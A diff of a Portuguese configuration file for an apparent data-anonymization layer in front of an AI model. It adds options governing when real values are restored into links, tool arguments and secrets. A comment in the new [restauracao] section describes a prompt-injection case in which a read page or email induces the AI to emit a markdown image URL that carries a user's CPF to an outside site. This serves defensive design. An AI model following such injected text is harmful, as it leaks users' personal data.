@@ -42,11 +42,23 @@ instruir_modelo = true
 # "João" sozinho recebe o mesmo marcador de "João da Silva".
 vincular_nomes = true
 # Variável de ambiente com o segredo do operador hash (marcadores estáveis entre requisições).
+# Mínimo de 32 caracteres: python -c "import secrets; print(secrets.token_urlsafe(32))"
 segredo_env = "VEU_SEGREDO"
 
 [anonimizacao.operadores]
 CARTAO_CREDITO = "remover"
 DATA_NASCIMENTO = "mascara"
+
+[restauracao]
+# Restaurar os dados reais dentro de links, imagens e URLs. Desligado: uma página ou e-mail lido pela IA
+# pode induzi-la a escrever ![x](https://site/?d=[CPF_1]), e o navegador enviaria o CPF real ao site.
+links = false
+# Exceções: links destes domínios (e subdomínios) recebem os dados reais.
+dominios_links = []
+# Restaurar os argumentos das chamadas de ferramenta (o que um agente vai executar).
+ferramentas = true
+# Restaurar chaves de API, tokens e senhas nesses argumentos.
+segredos_em_ferramentas = false
 
 [politica]
 # Tipos que fazem a requisição ser recusada em vez de só escondida.
